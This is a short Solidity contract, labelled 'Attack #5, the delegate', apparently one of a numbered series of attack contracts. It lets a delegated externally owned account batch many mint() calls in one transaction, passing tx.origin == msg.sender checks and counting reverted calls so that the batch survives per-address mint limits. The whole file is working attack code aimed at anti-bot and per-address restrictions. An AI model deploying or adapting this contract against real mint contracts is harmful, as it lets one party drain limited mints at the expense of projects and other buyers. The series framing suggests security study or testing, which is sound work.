// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

/// Attack #5, the delegate. A delegated EOA uses this to batch many mint() calls into
/// one transaction. Each call is made in the EOA's own context (so tx.origin ==
/// msg.sender). Sub-calls that revert are counted, not propagated, so the batch
/// survives a per-address limit.
contract BatchDelegate {
    function batchMint(address minter, uint256 n) external returns (uint256 ok, uint256 reverted) {
        for (uint256 i; i < n; i++) {
            (bool s, ) = minter.call(abi.encodeWithSignature("mint()"));
            if (s) ok++; else reverted++;
        }
    }
}
